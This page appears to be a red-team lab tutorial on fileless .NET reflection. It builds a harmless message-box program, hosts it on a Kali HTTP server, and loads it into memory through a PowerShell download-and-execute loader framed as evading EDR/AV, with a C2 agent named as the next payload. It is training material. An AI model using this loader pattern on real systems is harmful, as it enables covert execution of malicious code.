---
layout: default
title: "Introduction to Reflection"
permalink: /solo-purple-teaming/introduction-to-reflection/
---

<link rel="stylesheet" href="/assets/css/solo-purple-teaming.css">

<div class="spt-page">
<a class="spt-back" href="/solo-purple-teaming/">← Back to Solo Purple Teaming</a>
<section class="spt-hero">
<p class="spt-kicker">Solo Purple Teaming</p>
<h1>Introduction to Reflection</h1>
</section>
<section class="spt-content">

Owner: Mike Sterrett

# 💡 Using Reflection in .NET and PowerShell for Fileless Execution

---

## 🧠 Concept Overview: What is Reflection?

**Reflection** in .NET allows programs to inspect and interact with their own structure at runtime. For red teamers:

- It enables in-memory execution (no disk artifacts).
- Helps evade EDR/AV by avoiding file writes.
- Integrates well with **LOLBins** (e.g., `InstallUtil`, `MSBuild`).

---

## 🔍 Objective

Create a C# program that shows a message box, then **reflectively load it from PowerShell** using a PowerShell Runspace, simulating stealthy malware execution entirely in memory.

---

## 🛠️ Part 1: Build the .NET Payload

### 🔹 1. Open Visual Studio on your Windows 11 Reverse Engineering VM

- Create a new project:
    
    `Console App (.NET Framework)`
    

![image.png](Introduction%20to%20Reflection/image.png)

- Name it: `TestingReflection`

![image.png](Introduction%20to%20Reflection/image%201.png)

- Click **Create**

---

### 🔹 2. Clean Up Using Statements

Remove any unnecessary `using` statements at the top.

![image.png](Introduction%20to%20Reflection/image%202.png)

---

### 🔹 3. Add the Execute Function

Inside the `Program` class:

```csharp
public static void Execute()
{
    string[] args = {};
    Main(args);
}

```

![image.png](Introduction%20to%20Reflection/image%203.png)

Modify `Main` to just show a message box.

---

### 🔹 4. Add Windows Forms Reference

- Right-click **References** > **Add Reference**
- Under **Assemblies**, check:
    - `System.Windows.Forms`
- Click OK

![image.png](Introduction%20to%20Reflection/image%204.png)

- Add this at the top:

```csharp
using System.Windows.Forms;

```

![image.png](Introduction%20to%20Reflection/image%205.png)

---

### 🔹 5. Update Main Method

```csharp
static void Main(string[] args)
{
    MessageBox.Show("You have been PWNd!", "Reflection Test");
}

```

![image.png](Introduction%20to%20Reflection/image%206.png)

---

### 🔹 6. Set to x64 and Release Mode

- Open **Configuration Manager**
- Create new platform: `x64`

![image.png](Introduction%20to%20Reflection/image%207.png)

- Set build mode to **Release**
- Build the solution: `Build > Build Solution`

![image.png](Introduction%20to%20Reflection/image%208.png)

- Test by selecting `Start`
    
    ![image.png](Introduction%20to%20Reflection/image%209.png)
    

---

## 🔄 Part 2: Host Payload on Kali Linux

### 🔹 7. Locate the Compiled Binary

Path:

```
cd C:\Users\ReverseEngineer\source\repos\TestingReflection\TestingReflection\bin\x64\Release\

```

### 🔹 8. Transfer Binary to Kali

From Windows CMD or PowerShell:

```bash
scp TestingReflection.exe username@10.0.3.2:~/Downloads/

```

- Replace `10.0.3.2` with your Kali IP.
- Ensure Python HTTP server is serving `~/Downloads`:

![image.png](Introduction%20to%20Reflection/image%2010.png)

- Start http server on Kali

```bash
cd ~/Downloads
python3 -m http.server 8000

```

---

## 💻 Part 3: Reflectively Load Using PowerShell + C#

### 🔹 9. Modify the PowerShell Loader

In your second Visual Studio project (`GoodbyeAMSI`):

### ❗Comment out the old payload

Add this code in its place:

```csharp
string script = @"$bytes = (Invoke-WebRequest -Uri ""http://10.0.3.2:8000/TestingReflection.exe"").Content
                $loadedAssembly = [System.Reflection.Assembly]::Load($bytes)
								$typeName = ""TestingReflection.Program""
								$type = $loadedAssembly.GetType($typeName)
								$instance = [Activator]::CreateInstance($type)
								$methodName = ""Execute""
								$method = $type.GetMethod($methodName)
								$result = $method.Invoke($instance, $null)
";

```

![image.png](Introduction%20to%20Reflection/image%2011.png)

---

### 🔹 10. Build the Loader

- Set build to **x64 Debug**.

![image.png](Introduction%20to%20Reflection/image%2012.png)

- Build > Build Solution

![image.png](Introduction%20to%20Reflection/image%2013.png)

---

### 🔹 11. Run the Loader

Navigate to the binary:

```
cd C:\Users\ReverseEngineer\source\repos\GoodbyeAMSI\GoodbyeAMSI\bin\x64\Debug\

```

![image.png](Introduction%20to%20Reflection/image%2014.png)

Run the executable

```json
.\GoodbyeAMSI.exe
```

You should see a **message box** pop up saying:

> “You have been PWNd!”
> 

![image.png](Introduction%20to%20Reflection/image%2015.png)

---

## 🧪 Part 4: Troubleshooting (Optional)

If it doesn't work:

### 1. Open Notepad++

Paste the reflection PowerShell script.

### 2. Open PowerShell

Run each line manually:

```powershell
$bytes = (Invoke-WebRequest -Uri "http://10.0.3.2:8000/TestingReflection.exe").Content
$bytes.Length  # Confirm it's non-zero (e.g., 4096)

$loadedAssembly = [System.Reflection.Assembly]::Load($bytes)
$loadedAssembly  # Should return the assembly object

$type = $loadedAssembly.GetType("TestingReflection.Program")
$instance = [Activator]::CreateInstance($type)
$method = $type.GetMethod("Execute")
$method.Invoke($instance, $null)

```

Check for:

- Correct namespace and class name
- Correct method name (no typos like `Excute`)

---

## ✅ Final Output

You should see a **message box** appear without writing any file to disk — all loaded via memory!

---

## 🔄 Next Steps

In the next lecture, you'll use this template to reflectively load the **Apollo agent**.

### ✅ Before proceeding:

- Make sure your `TestingReflection.exe` runs.
- Your loader (`GoodbyeAMSI.exe`) should successfully reflectively load and execute it.
- You should *not* see any console popups—only the message box from memory execution.

</section>
</div>
